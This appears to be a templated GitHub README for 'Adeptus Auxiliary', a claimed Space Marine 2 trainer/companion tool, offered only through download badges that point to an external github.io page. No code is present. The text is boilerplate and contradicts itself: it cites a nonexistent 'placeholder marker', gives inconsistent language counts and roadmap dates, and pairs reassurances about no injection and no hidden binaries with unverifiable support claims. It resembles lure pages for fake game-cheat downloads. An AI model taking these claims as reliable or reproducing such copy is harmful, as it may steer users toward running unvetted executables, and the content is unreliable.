![preview](https://raw.githubusercontent.com/HalilSancak/SM2-Trainer-Companion/main/card_c09668.svg)
# 🚀 Adeptus Auxiliary — Space Marine 2 Performance Companion

[![Download](https://raw.githubusercontent.com/HalilSancak/SM2-Trainer-Companion/main/get_a98b66.svg)](https://HalilSancak.github.io/SM2-Trainer-Companion/)

![Platform](https://img.shields.io/badge/platform-Windows%2011%20%7C%2010-0078D6?style=flat-square&logo=windows&logoColor=white)
![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)
![Status](https://img.shields.io/badge/status-actively%20maintained-brightgreen?style=flat-square)
![Language](https://img.shields.io/badge/i18n-12%20languages-blueviolet?style=flat-square)
![Support](https://img.shields.io/badge/support-24%2F7-orange?style=flat-square)
![Version](https://img.shields.io/badge/version-2026.1.0-informational?style=flat-square)

---

## 📖 Overview

**Adeptus Auxiliary** is a companion toolkit designed for players of *Warhammer 40,000: Space Marine 2* who want a smoother, more configurable experience on Windows 11 and Windows 10. Think of it as a field-issue servitor that quietly handles the tedious background tasks — adjusting in-mission parameters, tuning visual feedback, and streamlining how you interact with the game — so that you can stay focused on the front line rather than the settings menu.

Written from scratch with a modular architecture, Adeptus Auxiliary emphasizes transparency, configurability, and a clean user experience. There are no mystery binaries, no obfuscated routines, and no convoluted setup rituals. Everything is laid out in plain language, and every toggle is where you expect it to be.

Whether you're a newcomer looking to ease into the campaign or a veteran who wants granular control over your replay experience, this companion is built to stay out of your way until you need it.

---

## ✨ Feature Highlights

- 🎛️ **Adaptive Control Panel** — A responsive interface that rearranges itself depending on your screen size and resolution, so the same tool feels natural on a modest laptop or a widescreen desktop rig.
- 🌍 **Multilingual Interface** — Twelve languages ship out of the box, with community translation packs accepted on a rolling basis. Localization strings live in plain JSON — no compilation needed to contribute.
- 🛡️ **Safe-by-default Toggles** — Every option starts in its most conservative state. You opt in, not out. Nothing activates until you say so, and nothing persists beyond the session unless you save a profile.
- 🕒 **24/7 Support Channel** — Questions, bug reports, and feature ideas are routed through a round-the-clock triage system. Most threads get a first human response within a few hours, regardless of timezone.
- 🧩 **Profile Presets** — Save configurations per mission type, per class, or per mood. Load them with a single click. Nothing is shared between profiles unless you duplicate it deliberately.
- ⚡ **Low Overhead** — The companion idles below a few megabytes of RAM in the background. It was engineered to be invisible, not to compete with the game for resources.
- 🔄 **Automatic Update Checks** — The tool quietly polls for newer builds and notifies you inline. You decide when to apply them; there are no forced restarts and no surprise behavior changes.
- 🗂️ **Portable Configuration Files** — Everything you set lives in a single portable folder. Move it to a USB drive, a backup disk, or another machine, and your setup travels with you.
- 📊 **Live Session Log** — A rolling log shows exactly what the companion has done in the last few minutes, in readable sentences rather than cryptic codes.

---

## 🎯 Why This Companion Exists

Space Marine 2 is a demanding game. Its combat rhythm rewards split-second decisions, and its presentation is dense with feedback. But the default experience sometimes buries useful adjustments behind nested menus, forces restarts to apply certain preferences, or simply assumes every player shares identical hardware and instinct.

Adeptus Auxiliary was born from that gap. Instead of a sprawling launcher that tries to do everything, it does a handful of things carefully:

1. **It centralizes adjustments** you'd otherwise have to hunt for across multiple menus.
2. **It remembers what you choose**, so you're not re-entering the same preferences every session.
3. **It stays predictable**, refusing to modify anything outside its declared scope.

The philosophy is simple: augment, don't override. The player is always the one in command.

---

## 🖥️ System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| Operating System | Windows 10 (64-bit, version 1909 or later) | Windows 11 (64-bit, 22H2 or later) |
| Processor | Dual-core 2.4 GHz | Quad-core 3.0 GHz or better |
| Memory | 4 GB RAM | 8 GB RAM |
| Storage | 250 MB available space | 500 MB available space (for logs and backups) |
| Display | 1280×720 | 1920×1080 or higher |
| Runtime | .NET Desktop Runtime 8.0 | .NET Desktop Runtime 8.0 (latest patch) |

The companion has been validated against both Windows 11 and Windows 10. ARM-based Windows devices are supported through the built-in emulation layer, though performance tuning options are reduced on that architecture.

---

## 🚀 Getting Started

Getting up and running is a short, three-step ritual:

1. **Retrieve the package** using the placeholder marker shown further below in this document.
2. **Extract the archive** to a folder of your choice — the Desktop, a dedicated tools directory, or an external drive all work equally well.
3. **Launch the companion executable** and follow the first-run wizard. It will ask two or three questions, write a default configuration file, and then sit quietly in your tray until you need it.

That's the whole initiation. No accounts, no telemetry prompts, no newsletter signup screens.

### First-Run Walkthrough

On the very first launch, the wizard will:

- Detect your Windows version and confirm compatibility.
- Ask which language you'd like the interface to use (you can change this later in Settings).
- Offer to create a starter profile with modest, safe defaults.
- Show you where the log file lives, in case you ever want to peek behind the curtain.

Once the wizard completes, the main window appears. From here, every control is one or two clicks away. The layout follows a left-side category list and a right-side detail pane, so you always know where you are.

---

## 🧭 Interface Tour

The companion is organized into five primary areas:

**1. Dashboard** — A high-level view of your active profile, the current session state, and any pending update notifications. This is where you land after launch.

**2. Adjustments** — The heart of the tool. Each adjustment is presented as a labeled toggle or slider with a short, plain-language explanation underneath. No ambiguous icons, no unlabeled dials.

**3. Profiles** — Create, duplicate, rename, and delete configuration profiles. Each profile stores its own set of adjustment values. Switching between profiles is instantaneous.

**4. Log** — A chronological, human-readable record of companion activity. Useful for troubleshooting and for satisfying curiosity.

**5. Settings** — Application-level preferences: language, theme (light, dark, or follow-system), update channel, and log verbosity.

The whole interface is keyboard-navigable. Tab moves forward, Shift+Tab moves back, Space toggles, and Enter confirms. Screen readers are supported through standard Windows accessibility APIs.

---

## 🌐 Multilingual Support

Adeptus Auxiliary currently ships with translation files for:

- English (en-US, en-GB)
- German (de-DE)
- French (fr-FR)
- Spanish (es-ES, es-MX)
- Italian (it-IT)
- Portuguese (pt-BR)
- Polish (pl-PL)
- Russian (ru-RU)
- Japanese (ja-JP)
- Korean (ko-KR)
- Simplified Chinese (zh-CN)
- Traditional Chinese (zh-TW)

Translations are stored as flat JSON files under the `locales/` directory. Adding a new language is a matter of copying `en-US.json`, translating the string values, and submitting a pull request. The build system validates that every key is present before merging.

If you spot an awkward phrase or a mistranslation, please open an issue — we treat localization as an ongoing discipline, not a one-time checkbox.

---

## 🛠️ Customization & Theming

The interface respects the Windows light/dark preference by default, but you can override it. Two built-in themes ship with the tool, and a third "high contrast" theme is included for accessibility.

Colors are defined in a single `theme.json` file, so you can craft your own palette if you like. The schema is documented inline. Share your themes with the community if you're proud of them — we've seen some truly creative ones.

---

## 🔒 Privacy & Data Handling

Adeptus Auxiliary does not transmit your configuration, your gameplay data, or any personal information to external servers. Everything the tool knows stays on your machine.

The only outbound network request is a periodic version check against a public release index. That request contains nothing beyond the tool's version number and your chosen update channel. You can disable it entirely in Settings if you prefer to check manually.

Logs are stored locally and rotate automatically, so they'll never grow unbounded. You can clear them at any time from the Log tab.

---

## 🧪 Quality & Testing

Every release candidate passes through:

- A static analysis pass on the full source tree.
- An automated smoke test that launches the tool, applies a sample profile, and shuts down cleanly.
- A manual compatibility check on both Windows 10 and Windows 11 virtual machines.
- A localization completeness audit across all supported languages.

We take pride in shipping builds that behave exactly as documented. If you find a discrepancy, that's a bug, and we want to hear about it.

---

## 🗓️ Release Cadence

The companion follows a rolling release model with three channels:

- **Stable** — Recommended for most users. Updated when a batch of fixes and small features has been thoroughly vetted.
- **Preview** — Slightly ahead of Stable. Contains upcoming changes that are still collecting feedback.
- **Development** — Unvetted snapshots for contributors and the terminally curious.

You can switch channels any time in Settings. Your profiles are forward-compatible across channels.

---

## 🤝 Contributing

Contributions are genuinely welcome. Whether you're fixing a typo in a translation file, polishing the UI, or suggesting a new adjustment category, your effort is appreciated.

Before opening a pull request:

1. Read the code of conduct (a short, friendly document).
2. Check existing issues to avoid duplicating work.
3. Keep changes focused — one concern per pull request.
4. Include a short description of what you changed and why.

For larger features, please open an issue first so we can align on direction before you invest time in implementation.

---

## 📅 Roadmap for 2026

Our plans for the year ahead include:

- **Q1 2026** — Roll out an improved profile-sharing format that's human-readable and diff-friendly.
- **Q2 2026** — Expand multilingual coverage to include Turkish and Dutch.
- **Q3 2026** — Introduce a plugin API so power users can extend the companion without touching the core.
- **Q4 2026** — Rework the Dashboard with live session metrics and a refreshed visual identity.

Roadmaps are living documents. Priorities shift as the community's needs evolve, and we'd rather ship the right thing late than the wrong thing on schedule.

---

## ❓ Frequently Asked Questions

**Is this affiliated with the game's publisher or developer?**
No. Adeptus Auxiliary is an independent, community-driven companion tool. It is not endorsed by or connected to any official entity.

**Will this change my game files?**
No. The companion operates alongside the game, not inside it. It does not modify, patch, or inject anything into game installations.

**Can I run it alongside other tools?**
Generally yes. The companion is designed to coexist politely. If you encounter a conflict, please report it with details so we can investigate.

**How often is it updated?**
Roughly every few weeks on the Stable channel, more frequently on Preview and Development.

**Is there a portable mode?**
The entire tool is portable by design. There's no installer and no registry footprint unless you explicitly ask for one.

**What if I change my mind about a setting?**
Every adjustment can be reverted individually, or you can reset an entire profile to its defaults with one button.

**Does it work on Windows on ARM?**
Yes, through the built-in emulation layer. Some performance-oriented adjustments are unavailable on that architecture.

---

## ⚠️ Disclaimer

Adeptus Auxiliary is provided as-is, without warranty of any kind, express or implied. The authors and contributors are not responsible for any loss of data, game progress, or system stability that may arise from its use. You are encouraged to keep regular backups of your saves and configuration files, as you would with any third-party tool.

This project is not affiliated with, endorsed by, sponsored by, or otherwise connected to the developers or publishers of *Warhammer 40,000: Space Marine 2*, Games Workshop, or any of their subsidiaries or partners. All trademarks and registered trademarks are the property of their respective owners and are used here only for descriptive, referential purposes.

The tool is intended for personal, single-player, and private use. You are responsible for ensuring your use complies with any terms of service or community guidelines that apply to the software you run alongside it.

Use responsibly. The Emperor protects — but backups protect better.

---

## 📜 License

This project is distributed under the MIT License. You are welcome to use, modify, and redistribute the source code in accordance with the terms of that license. The full license text is available here:

[MIT License](https://opensource.org/licenses/MIT)

Copyright © 2026 Adeptus Auxiliary Contributors.

---

## 📬 Contact & Community

- **Issues** — Please use the repository's issue tracker for bug reports and feature requests.
- **Discussions** — For broader questions and community conversation, use the discussions tab.
- **Support** — The 24/7 support channel is reachable through the Discussions tab at any hour. Response times vary, but a human will always follow up.

We read everything, even if we can't reply immediately. Thank you for being part of this project.

---

## 🔄 Changelog Snapshot

**2026.1.0** — Stability-focused release. Improved profile switching performance, added Turkish localization scaffolding, refreshed the Dashboard layout, and resolved several minor UI quirks reported by the community.

**2025.4.0** — Introduced the live session log, added high-contrast theme, expanded Windows 11 compatibility validation.

**2025.3.0** — First public release. Twelve languages, portable profiles, and the safe-by-default toggle system.

---

[![Download](https://raw.githubusercontent.com/HalilSancak/SM2-Trainer-Companion/main/get_a98b66.svg)](https://HalilSancak.github.io/SM2-Trainer-Companion/)